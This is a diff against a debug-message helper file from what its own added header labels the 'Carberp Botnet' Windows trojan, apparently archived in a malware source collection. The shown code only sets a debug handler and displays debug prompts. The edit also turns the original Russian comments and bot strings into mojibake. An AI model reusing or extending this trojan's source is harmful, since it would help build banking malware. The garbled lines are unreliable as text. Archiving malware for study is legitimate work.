@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 
 
@@ -13,7 +24,7 @@ DWORD HandlerPID = 0;
 LPVOID DebugMsgHandler = NULL;
 TDebugMessageHandlerMethod DebugMsgHandlerHandlerMethod;
 
-// Установить обработчик отладочных строк
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 void SetDebugMessageHandler(LPVOID Handler, TDebugMessageHandlerMethod Method)
 {
 	IsNewProcess(HandlerPID);
@@ -23,7 +34,7 @@ void SetDebugMessageHandler(LPVOID Handler, TDebugMessageHandlerMethod Method)
 
 #ifdef DEBUGBOT
 
-PCHAR StartDebugMSG = "Бот запущен в отладочном режиме! Продолжить?";
+PCHAR StartDebugMSG = "пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ! пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ?";
 
 bool StartInDebugingMode(bool ShMSG)
 {
@@ -41,14 +52,14 @@ bool StartInDebugingMode(bool ShMSG)
 
 /* void DebugMessage(PCHAR Msg)
 {
-	// Вывести сообщение
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	pMessageBoxA(0, Msg, NULL, MB_OK);
 }
 */
 
 void Debug::MessageEx(PCHAR Module, DWORD Line, PCHAR Section, PCHAR ExtData, PCHAR Str, ...)
 {
-	// Вызвать отладочное сообщение
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR FullLine = STR::Alloc(StrCalcLength(Str) + 4096);
 
 	va_list Arguments;
